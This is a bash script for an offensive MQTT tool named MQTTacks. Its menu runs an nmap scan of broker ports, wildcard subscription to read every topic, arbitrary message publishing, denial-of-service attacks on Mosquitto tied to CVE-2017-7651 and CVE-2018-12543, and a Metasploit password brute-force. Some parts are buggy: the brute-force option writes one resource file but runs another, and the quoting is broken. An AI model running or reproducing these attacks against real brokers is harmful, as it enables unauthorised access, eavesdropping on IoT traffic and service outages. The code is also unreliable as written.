#!/bin/bash

clear
#Project: MQTTacks (MQTT Attacks)
#Coded By: souravbaghz

#+++++++++++++++++++++++++ WARNINGS ++++++++++++++++++++++++++ 
#EDUCATIONAL PURPOSE ONLY - DON'T USE ON UNAUTHORISED VEHICLES
#I AM NOT RESPONSIBLE FOR ANY BAD USE OF THIS TOOL 
host_ip="$1"
#Colours
bold="\e[1m"
italic="\e[3m"
reset="\e[0m"
blink="\e[5m"
crayn="\e[36m"
yellow="\e[93m"
red="\e[31m"
black="\e[30m"
green="\e[92m"
redbg="\e[41m"
greenbg="\e[40m"

banner(){
echo -e "$green

   █▀▄▀█ █▀█ ▀█▀ ▀█▀ ▄▀█ █▀▀ █▄▀
   █░▀░█ ▀▀█ ░█░ ░█░ █▀█ █▄▄ █░█
        ${reset}coded by souravbaghz${green}                           
 $reset────────────────────────────────"
}

if [ -z "$1" ]
  then
    banner
    echo " Host is not supplied"  #host not supplied 
    echo " Usage : mqttack.sh <host>"
    echo " Example: ./mqttack.sh host_IP"
    exit 1
fi

trap ctrl_c INT

ctrl_c(){
   echo
   echo "CTRL_C by user"
   menu
}

menu(){
banner
echo -e "$green [*] Target Host:$reset $host_ip"
echo -e " ────────────────────────────────"
echo -e "$red [1]$green Scan for MQTT Service"
echo -e "$red [2]$green Subscribe to All Topics"
echo -e "$red [3]$green Subscribe to a Single Topic"
echo -e "$red [4]$green Publish a Message"
echo -e "$red [5]$green DOS Attack - CVE-2017-7651(Mosquitto Ver 1.4.14)"
echo -e "$red [6]$green DOS Attack - CVE-2018-12543(Mosquitto Ver 1.5 to 1.5.2)"
echo -e "$red [7]$green Password Bruteforce Attack"
echo -e "$red [8]$green Login and Subscribe to Topics"
echo -e "$red [0]$green Exit$reset"
read -p " [?] Choose: " option

if [[ $option = 1 || $option = 01 ]]
	then
	    clear
	    banner
	    echo -e "$red [*]$reset MQTT Services Scan Started!"
	    echo -e " ────────────────────────────────"
        nmap -sV -sC -p1883,8883 $host_ip
        echo
        read -r -s -p $'>Press ENTER to Go Menu...'
        clear
		menu

	elif [[ $option = 2 || $option = 02 ]]
	   then
	    clear
	    banner
	    echo -e "$red [*]$reset Subscribed to All Topics!"
	    echo -e " ────────────────────────────────"
	    mosquitto_sub -v -t '#' -h $host_ip
		menu
        
    elif [[ $option = 3 || $option = 03 ]]
       then
       read -p "[?] Topic>" topic
         clear
         banner
         echo -e "$red [*]$reset Subscribed to '$topic' Only!"
	     echo -e " ────────────────────────────────"
         mosquitto_sub -v -t $topic -h $host_ip
		 menu
		 
	elif [[ $option = 4 || $option = 04 ]]
       then
       read -p "[?] Topic>" topic
       read -p "[?] Message>" msg
         mosquitto_pub -t $topic -h $host_ip -m $msg
         echo " [!] Message Sent!"
         echo
		 read -r -s -p $'>Press ENTER to Go Menu...'
		 clear
		 menu

    elif [[ $option = 5 || $option = 05 ]]
       then
         ./src/MqttExploit
         read -r -s -p $'>Press ENTER to Go Menu...'
         clear
		 menu
		  	 
	elif [[ $option = 6 || $option = 06 ]]
       then
       TEST(){
       echo TEST
       }
       read -p "[?] Topic(Example: '$TEST')>" topic
         echo -e "$red [*]$reset CVE-2018-12543 : DOS Attack"
	     echo -e " ────────────────────────────────"
         mosquitto_pub -h $host_ip -t $topic -m "message"
         echo "> DOS Attack has been Performed!"
         echo 
		 menu
	
	elif [[ $option = 7 || $option = 07 ]]
       then
         echo "use auxiliary/scanner/mqtt/connect
         set rhosts" ""$host_ip" 
         set rport 1883
         set USER_FILE src/users.txt
         set PASS_FILE src/pass.txt
         run" | tee src/brute.rc
         clear
         banner
         echo -e "$red [*]$reset Password Bruteforce Attack"
	     echo -e " ────────────────────────────────"
         #running msfconsole
         msfconsole -r src/dos.rc
         echo 
		 read -r -s -p $'Press enter to go menu...'
		 clear
		 menu
		 	 	 
	elif [[ $option = 8 || $option = 08 ]]
       then
       read -p "[?] Username>" user
       read -p "[?] Password>" pass
         mosquitto_sub -v -t '#' -h $host_ip -u $user -P $pass
         echo 
		 read -r -s -p $'Press enter to go menu...'
		 menu
		 
	elif [[ $option = 0 || $option = 00 ]]
       then
         echo -e "[!]Exiting...${green}${reset}"
		 clear	 
         exit 1
         
        else
		echo "Invalid Option..."
		sleep 1
		clear
		menu
	fi	
}


menu

